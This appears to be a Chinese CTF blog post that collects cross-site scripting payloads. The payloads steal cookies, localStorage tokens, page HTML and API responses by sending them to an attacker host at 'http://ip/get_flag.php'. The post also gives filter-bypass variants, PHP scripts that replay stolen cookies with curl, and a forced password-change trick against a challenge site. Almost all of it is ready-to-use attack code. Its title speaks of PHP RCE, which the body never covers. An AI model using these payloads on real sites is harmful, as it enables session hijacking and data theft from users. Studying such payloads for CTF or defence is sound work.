---
title: PHP自增RCE构造
date: 2026-02-07
category: web
tags: ["web", "ctf", "基础漏洞"]
excerpt: 打靶时整理的一些payload
---

# XSS

## 1.自动触发cookie窃取

### 1.script嵌入脚本

 `<script>location.href="http://ip/get_flag.php?c="+document.cookie</script>`

### 2.图片异常

`<img src="xxx" onerror="location.href='http://ip/get_flag.php?c='+document.cookie">`

### 3.svg文本加载

`<svg onload="location.href='http://ip/get_flag.php?c='+document.cookie"/>`

### 4.内嵌网页

`<iframe onload=window.location.href='http://ip/get_flag.php?c='+document.cookie;>`

### 5.body闭合

`<body onload=location.href='http://ip/get_flag.php?c='+document.cookie>`

### 6.jQuery 选择器语法脚本

```
<script>$('.laytable-cell-1-0-1').each(function(index, value){if(value.innerHTML.indexOf('ctf'+'flag'+'{')>-1){ window.location.href='http://ip/get_flag.php?c='+value.innerHTML;}});</script>
```

### 7.请求伪造脚本

```php
<?php
if(isset($_GET['c']))
{
	$c = $_GET['c'];
	$ch = curl_init();
	curl_setopt($ch,CURLOPT_URL,'https://target_url'); 
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch,CURLOPT_COOKIE,$c);
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Host: host_url",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    "Accept: application/json, text/javascript, */*; q=0.01",
    "Accept-Language: zh-CN,zh;q=0.9",
    "Accept-Encoding: gzip, deflate, br, zstd",
    "X-Requested-With: XMLHttpRequest",
    "Referer: https://referer_url",
    "DNT: 1",
    "Connection: close"
	]);
	curl_setopt($ch, CURLOPT_ENCODING, "");
	$req = curl_exec($ch);
	file_put_contents('/var/tmp/xss_flag.log',$req);
	curl_close($ch);
    }
?>

```

```php
<?php

// 获取GET参数中的cookie值
$cookie = $_GET['c'];

// 初始化cURL会话
$ch = curl_init();

// 设置cURL选项
curl_setopt($ch, CURLOPT_URL, "http://target_url");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // 返回数据而不是直接输出
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Host: host_url",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept: */*",
    "Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding: gzip, deflate",
    "X-Requested-With: XMLHttpRequest",
    "Referer: referer_url",
    "Cookie: {$cookie}",
    "DNT: 1",
    "Connection: close"
]);

// 接受压缩编码的数据
curl_setopt($ch, CURLOPT_ENCODING, ""); // 允许cURL自动解压缩响应内容

// 执行cURL请求并获取响应数据
$response = curl_exec($ch);

// 检查是否有错误
if ($response === false) {
    echo "cURL Error: " . curl_error($ch);
} else {
    // 保存响应数据到文件
    file_put_contents("response.txt", $response);
    //echo "Response saved to response.txt";
}

// 关闭cURL会话
curl_close($ch);

?>
```

```
<script>var gen = new XMLHttpRequest();gen.open('GET', '/api/search', false);gen.send(null);if (gen.status === 200){var t = gen.responseText;new Image().src = "http://ip/get_flag.php?c="+encodeURIComponent(t.slice(0, 2000));}</script>
```

### 8.题目分享，一个很有意思的payload

ctfshow330响应，change.php通过get修改密码

```
GET /api/change.php?p=12345678 HTTP/1.1
Host: fe178b3d-6299-44a8-89a9-6d24e1caefa1.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: http://fe178b3d-6299-44a8-89a9-6d24e1caefa1.challenge.ctf.show/change.php
Cookie: PHPSESSID=rerdh3bri3im0dlq86ennri52l
DNT: 1
Connection: close
```

不妨让admin去自己访问修改密码的链接自己去修改自己的密码

```
<script>location.href="http://127.0.0.1/api/change.php?p=12345678"</script>
```

请求方式变为post就不能直接访问url了，但是可以用ajax异步请求

`<script>$.ajax({url:'api/change.php',type:'post',data:{p:'123456'}})</script>`

但是ajax不能携带cookie

## 2.tooken

`<img src=x onerror='fetch("http://ip/get_flag.php?c="+encodeURIComponent(localStorage.token))'>`

## 3.html界面

`<img src="x" onerror="(new Image()).src='http://ip/?c='+encodeURIComponent(document.body.innerHTML);">`

## 4.响应体数据外带

```
<img src=x onerror="fetch('/api/archives').then(r=>r.json()).then(data=>{new Image().src='http://ip/get_flag.php?c='+btoa(JSON.stringify(data));});">
```

## 5.bypass

空格过滤，/分隔标签 ，/**/空注释

`<svg/onload="location.href='http://ip/get_flag.php?c='+document.cookie"/>`

`<svg/**/onload="location.href='http://ip/get_flag.php?c='+document.cookie"/>`

大小写绕过

`<ScrIpt></&lt;script>location.href=&quot;http://ip/get_flag.php?c=&quot;+document.cookie</ScrIpt>`

双写绕过

比如后端把payload中的script删除，这时候可以这样构造
`<scrscriptipt>location.href="http://ip/get_flag.php?c="+document.cookie</scrscriptipt>`
